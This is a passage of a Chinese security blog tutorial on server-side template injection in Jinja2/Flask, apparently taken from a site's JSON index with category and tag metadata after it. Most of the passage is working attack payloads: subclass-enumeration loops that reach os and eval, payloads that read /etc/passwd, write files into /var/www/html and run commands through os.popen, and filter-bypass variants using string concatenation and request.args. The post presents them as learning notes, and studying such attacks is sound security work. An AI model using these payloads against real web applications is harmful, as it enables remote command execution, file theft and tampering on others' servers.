获取基本类后，继续获取基本类的object的子类 object.__subclasses__() 这里可能子类中含有可以利用的函数，例如eval等 也可以利用模板控制语句 例如这样： {%for c in ''.__class__.__base__.__subclasses__()%} {% if 'os' in c.__init__.__globals__%} {{loop.index0 ~'_'~c.__name__~'-'}} {% else %} {{ '-' }} {%endif%} {% endfor %} 2.利用内置模块执行命令上面的实例中我们使用dir把内置的对象列举出来，其实可以用__globals__更深入的去看每个类可以调用的东西（包括模块，类，变量等等），如果有os这种可以直接传入命令，造成命令执行 利用控制语句找到可用的模块，或者builtins {% for c in ''.__class__.__base__.__subclasses__() %} {% if '__builtins__' in c.__init__.__globals__%} {{loop.index0 ~'_'~c.__name__~'-'}} {% else %} {{ '-' }} {%endif%} {{''.__class__.__base__.__subclasses__()[81].__init__.__globals__['__builtins__']}} 2.一些常用的payload//获取基本类 ''.__class__.__mro__[1] {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] object //读文件 ().__class__.__bases__[0].__subclasses__()[40](r'C:\\1.php').read() object.__subclasses__()[40](r'C:\\1.php').read() //写文件 ().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123') object.__subclasses__()[40]('/var/www/html/input', 'w').write('123') //执行任意命令 ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls /var/www/html\").read()' ) object.__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls /var/www/html\").read()' ) 查找命令 {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__(\"os\").popen(\"id\").read()') }} //poppen的参数就是要执行的命令 {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} 3.命令执行1、os.system()用法：os.system(command)但是用这个无法回显 2、os.popen()用法：os.popen(command[,mode[,bufsize]]) popen方法通过p.read()获取终端输出，而且popen需要关闭close().当执行成功时，close()不返回任何值，失败时，close()返回系统返回值（失败返回1）. 可见它获取返回值的方式和os.system不同。还需要了解一个魔法函数globals该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。 ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls \").read()' ) 4、Bypass如果遇到了过滤的情况，可以利用一下方式 1.拼接例子： object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls') ####2.过滤””[] 例子： 借助request对象：request变量可以访问所有已发送的参数，因此我们可以request.args.param用来检索新的paramGET参数的值,将其中的request.args改为request.values则利用post的方式进行传参 {{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&amp;path=/etc/passwd ####3.过滤双下划线__ 还是request方法 例子： {{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ 4.过滤一些函数名如__import__等例子： python的初始模块_builtin__里有很多危险的方法，一条路没了就找找其他的路我们可以直接用 eval() exec() execfile()等 __builtins__.eval() 无、参考文章 https://www.cnblogs.com/bmjoker/p/13508538.html https://www.cnblogs.com/Xy--1/p/12841941.html#gallery-1","categories":[{"name":"学习","slug":"学习","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]}],"categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"},{"name":"学习","slug":"学习","permalink":"http://h3geeker.top/categories/%E5%AD%A6%E4%B9%A0/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://h3geeker.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"CVE复现","slug":"CVE复现","permalink":"http://h3geeker.top/categories/CVE%E5%A4%8D%E7%8E%B0/"},{"name":"随笔","slug":"随笔","permalink":"http://h3geeker.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"大赛wp","slug":"大赛wp","permalink":"http://h3geeker.top/tags/%E5%A4%A7%E8%B5%9Bwp/"},{"name":"网络安全","slug":"网络安全","permalink":"http://h3geeker.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://h3geeker.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"做题记录","slug":"做题记录","permalink":"http://h3geeker.top/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"name":"CVE漏洞复现","slug":"CVE漏洞复现","permalink":"http://h3geeker.top/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"CVE-2019-9081","slug":"CVE-2019-9081","permalink":"http://h3geeker.top/tags/CVE-2019-9081/"},{"name":"随笔","slug":"随笔","permalink":"http://h3geeker.top/tags/%E9%9A%8F%E7%AC%94/"},{"name":"CVE漏洞复现 , CVE-2019-8362","slug":"CVE漏洞复现-CVE-2019-8362","permalink":"http://h3geeker.top/tags/CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-8362/"}]}